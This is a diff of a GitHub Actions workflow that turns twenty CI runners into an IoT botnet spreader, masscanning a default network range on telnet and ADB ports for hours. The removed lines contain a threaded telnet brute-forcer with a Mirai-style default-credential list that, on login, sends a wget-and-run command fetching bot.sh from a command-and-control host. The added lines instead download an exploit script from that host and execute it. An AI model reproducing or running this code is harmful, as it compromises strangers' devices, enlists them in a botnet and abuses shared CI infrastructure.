@@ -12,7 +12,7 @@ on:
         required: true
         default: '1337'
       scan_target:
-        description: 'CIDR to scan'
+        description: 'CIDR'
         required: true
         default: '114.54.0.0/16'
   schedule:
@@ -26,125 +26,41 @@ jobs:
       matrix:
         slice: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
     steps:
-      - name: Hunt IoT
+      - name: Hunt
         run: |
+          set -e
           C2="${{ github.event.inputs.c2 }}"
           CPORT="${{ github.event.inputs.c2_port }}"
           CIDR="${{ github.event.inputs.scan_target }}"
           S="${{ matrix.slice }}"
+          TOTAL=20
 
-          echo "[+] Runner $S/${{ matrix.slice }} hunting $CIDR -> C2: $C2:$CPORT"
+          echo "[+] Runner $S/$TOTAL hunting $CIDR -> $C2:$CPORT"
           sudo apt-get update -qq && sudo apt-get install -y -qq masscan 2>/dev/null
-          curl -s "http://$C2:$CPORT/bot.sh" -o /tmp/payload.sh
 
-          # Continuous hunting loop - each round scans a different slice
+          # Download exploit script from C2
+          curl -s "http://$C2:$CPORT/iot-exploit.py" -o /tmp/exploit.py
+
           ROUND=0
-          END_TIME=$(($(date +%s) + 19800))  # 5.5 hours
+          END_TIME=$(($(date +%s) + 19800))
 
           while [ $(date +%s) -lt $END_TIME ]; do
             ROUND=$((ROUND + 1))
+            OFFSET=$(( (ROUND * TOTAL + S) * 3277 % 65536 ))
 
-            # Calculate a pseudo-random slice offset based on round + runner
-            OFFSET=$(( (ROUND * 20 + $S) * 3277 % 65536 ))
+            # Calculate slice range (single-line python -c)
+            SLICE=$(python3 -c "import sys;b=int(''.join(['%02x'%int(x)for x in '$CIDR'.split('/')[0].split('.')]),16);s=b+$OFFSET;e=min(b+65535,s+3276);print('%d.%d.%d.%d-%d.%d.%d.%d'%((s>>24)&255,(s>>16)&255,(s>>8)&255,s&255,(e>>24)&255,(e>>16)&255,(e>>8)&255,e&255))")
 
-            SLICE_RANGE=$(python3 -c "
-            base_ip = '$CIDR'.split('/')[0]
-            parts = [int(x) for x in base_ip.split('.')]
-            base = (parts[0]<<24)|(parts[1]<<16)|(parts[2]<<8)|parts[3]
-            start = base + $OFFSET
-            end = min(base + 65535, start + 3276)
-            def ip(n): return f'{(n>>24)&255}.{(n>>16)&255}.{(n>>8)&255}.{n&255}'
-            print(f'{ip(start)}-{ip(end)}')
-            ")
+            echo "[+] R$ROUND S$S range=$SLICE"
+            sudo masscan "$SLICE" -p23,2323,5555 --rate 5000 -oL /tmp/scan.txt 2>/dev/null || true
 
-            echo "[+] Round $ROUND | Slice $S offset=$OFFSET range=$SLICE_RANGE"
-
-            sudo masscan "$SLICE_RANGE" -p23,2323,5555 --rate 5000 -oL /tmp/scan.txt 2>/dev/null || true
-            FOUND=$(grep -c open /tmp/scan.txt 2>/dev/null || echo 0)
-            echo "[+] Found: $FOUND open ports"
-
-            if [ "$FOUND" -gt 0 ]; then
-              python3 /dev/stdin "$C2" "$CPORT" "$S" << 'PYEOF'
-
-          # Brute force
-          python3 /dev/stdin "$C2" "$CPORT" "$S" << 'PYEOF'
-          import socket, threading, time, sys
-
-          C2, CPORT, S = sys.argv[1], sys.argv[2], int(sys.argv[3])
-
-          creds = [
-              ("root","vizxv"),("root","xc3511"),("root","hi3518"),("root","anko"),
-              ("root","root"),("root","admin"),("root","123456"),("root","password"),
-              ("root","default"),("root","12345"),("root","888888"),("root","666666"),
-              ("root","pass"),("root","system"),("root","changeme"),("root","klv123"),
-              ("root","zlxx"),("root","juantech"),("root","ipc71a"),("root","jvbzd"),
-              ("root","hi3516"),("root","iv001"),("root","tech"),
-              ("root","GM8182"),("root","1001chin"),("root","ikwb"),
-              ("admin","admin"),("admin","123456"),("admin","password"),
-              ("admin","admin123"),("admin","12345"),("admin","888888"),
-              ("support","support"),("guest","guest"),("guest","123456"),
-              ("service","service"),("operator","operator"),
-              ("user","user"),("ubnt","ubnt"),("pi","raspberry"),
-              ("default","default"),("mother","fucker"),
-          ]
-
-          hits = []
-          lock = threading.Lock()
-
-          def brute(ip, port, user, pw):
-              try:
-                  s = socket.socket()
-                  s.settimeout(8)
-                  s.connect((ip, port))
-                  s.recv(256)
-                  s.send(user.encode()+b"\r\n")
-                  time.sleep(0.3)
-                  s.recv(256)
-                  s.send(pw.encode()+b"\r\n")
-                  time.sleep(0.5)
-                  resp = s.recv(512)
-                  if b'#' in resp or b'$' in resp or b'>' in resp:
-                      cmd = f"(wget -q http://{C2}:{CPORT}/bot.sh -O /tmp/x&&sh /tmp/x {C2} {CPORT} enibot2024)&"
-                      s.send(cmd.encode()+b"\r\n")
-                      s.close()
-                      with lock:
-                          hits.append(f"{ip}:{port} {user}:{pw}")
-                      print(f"  HIT {ip}:{port} {user}:{pw}")
-                      return True
-                  s.close()
-              except:
-                  pass
-              return False
-
-          # Parse scan results
-          targets = set()
-          try:
-              for line in open('/tmp/scan.txt'):
-                  if 'open' in line:
-                      p = line.strip().split()
-                      if len(p)>=4:
-                          targets.add((p[3],int(p[2])))
-          except:
-              pass
-
-          print(f"[+] {len(targets)} targets found")
-
-          ts = []
-          for ip,port in targets:
-              for u,pw in creds[:30]:
-                  t = threading.Thread(target=brute, args=(ip,port,u,pw))
-                  t.start(); ts.append(t)
-                  time.sleep(0.01)
-
-          for t in ts: t.join(timeout=15)
-
-          print(f"[+] Runner {S}: {len(hits)} hits")
-          for h in hits: print(f"    {h}")
-          time.sleep(30)
-          PYEOF
+            if grep -q open /tmp/scan.txt 2>/dev/null; then
+              FOUND=$(grep -c open /tmp/scan.txt)
+              echo "[+] $FOUND targets — brute forcing..."
+              python3 /tmp/exploit.py "$C2" "$CPORT" "$S"
             fi
 
-            echo "[+] Round $ROUND done — ${FOUND} targets"
+            echo "[+] R$ROUND done"
           done
 
-          echo "[+] Runner $S finished after $ROUND rounds"
+          echo "[+] Runner $S finished — $ROUND rounds"
